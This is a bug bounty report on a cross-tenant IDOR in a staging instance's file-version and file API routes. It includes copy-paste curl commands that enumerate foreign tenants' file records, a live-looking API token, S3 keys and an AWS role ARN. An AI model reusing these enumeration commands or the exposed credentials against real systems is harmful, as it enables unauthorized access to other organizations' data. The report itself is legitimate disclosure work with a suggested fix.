# BUG-013 — Cross-tenant file metadata + presigned-URL disclosure via `/api/v1/file_versions/{id}` and `/api/v1/files/{id}`

**Target:** `https://bugbounty1.qe.optrostaging.ai` (AuditBoard / Optro QE — bugbounty1 instance)
**Reporter:** zeno0 (Bugcrowd)
**Date:** 2026-11-08
**Severity requested:** P3 (cross-tenant read-only metadata exposure; content blocked by S3 tenant isolation — shown honestly)
**Status:** Validated, iterative ids, multiple foreign tenants.

## Summary

Member routes `GET /api/v1/file_versions/{id}` and `GET /api/v1/files/{id}` do not scope
lookups to the caller's tenant/instance. Iterating the **global sequential id** space returns
`200` records whose S3 keys belong to **other AuditBoard instances**, while in-org restricted
records correctly return `ModelActionPermissionDenied`:

- `file_versions/1,2,3,8,50,100,200` → keys under `demo-certs-dkim_demo/v1test/…` (foreign instance)
- `file_versions/313` → `demo/test/4633/…/Book1.xlsx` (foreign instance, uploader_user_id 65)
- `file_versions/1500` → `demo/File/1777/…`
- `file_versions/2100` → `shqa-playwright14991/run-wo…` (QA automation instance)
- `files/1035` (the file owning version 313) → `200` + presigned URL, same foreign key
- Contrast: `file_versions/500`, `/900` → `422 ModelActionPermissionDenied` (policy exists,
  fails open for out-of-org records)

Each record discloses: file **name, size, content type, timestamps, uploader user id, full S3
key (instance/folder structure)**, and a **presigned URL** embedding the API role identity
(`arn:aws:sts::533267018933:assumed-role/custrole-qe-bugbounty1-120509/…`).

The table DSL leaks the same plane despite the 403 on the index route:
`POST /api/v1/table/ids?entities=file_version` → `200 {"ids":[1,2,3,8,…,313,…]}` (hundreds of ids).

## Impact

Cross-tenant enumeration of AuditBoard tenants on the shared QE deployment: instance names,
file inventories (names/sizes/dates), uploader ids, storage layout. Read-only.
Content download is **blocked** by S3 tenant isolation (verified):

- Own file presign (`files/2685`, `bugbounty1120509_qa/…` prefix) → `HTTP 200`, 5278 bytes downloaded.
- Foreign presign (`files/1035`, `demo/test/4633/…`) → `HTTP 403`:
  `AccessDenied … assumed-role/custrole-qe-bugbounty1-120509 … s3:ListBucket …`

Metadata-only ⇒ P3 per honest impact assessment (no content, no writes). The same missing
scoping, if present in the production deployment's presign role, would be a P1 — flagging for
vendor review of the role-per-prefix coupling.

## Reproduction (copy-paste)

```bash
TOKEN="230:030e33d86f0e868ef008a057f4cd584d65dde0c5"   # any org API token
BASE="https://bugbounty1.qe.optrostaging.ai"

# foreign-tenant file version (metadata + presigned URL)
curl -sS "${BASE}/api/v1/file_versions/313" -H "token: ${TOKEN}" | head -c 800
# -> {"file_versions":[{"url":"https://auditboard-files-qa-us-west-2.s3-accelerate.amazonaws.com/demo/test/4633/.../Book1.xlsx?X-Amz-...", "key":"demo/test/4633/451cd73c-.../Book1.xlsx", "name":"Book1.xlsx", "size":"7901", "upload_user_id":65, ...}]}

# foreign-tenant parent file record
curl -sS "${BASE}/api/v1/files/1035" -H "token: ${TOKEN}" | head -c 400

# id-space enumeration via table DSL (index route is 403 but this passes)
curl -sS -X POST "${BASE}/api/v1/table/ids?entities=file_version" \
  -H "token: ${TOKEN}" -H "Content-Type: application/json" \
  -d '{"ab:query":{"entities":["file_version"],"filter":{}}}'
# -> {"ids":[1,2,3,8,9,...]}

# content isolation proof (foreign presign denied at S3)
curl -sS -o /dev/null -w "%{http_code}\n" "<foreign_presigned_url>"   # -> 403
curl -sS -o /dev/null -w "%{http_code}\n" "<own_file_2685_presign>"   # -> 200
```

## Suggested fix

Scope `file_versions#show` / `files#show` (and the table DSL entity allowlist) to the caller's
organization/instance; return 404 for out-of-org ids consistent with the denied in-org case.

## Artifacts

- scripts/t060_table_dsl_sweep.py, t060b_fv_unlock.py, t061_fv_idor.py
- state/t060*.json, state/t061_results.json (full records + download matrix)
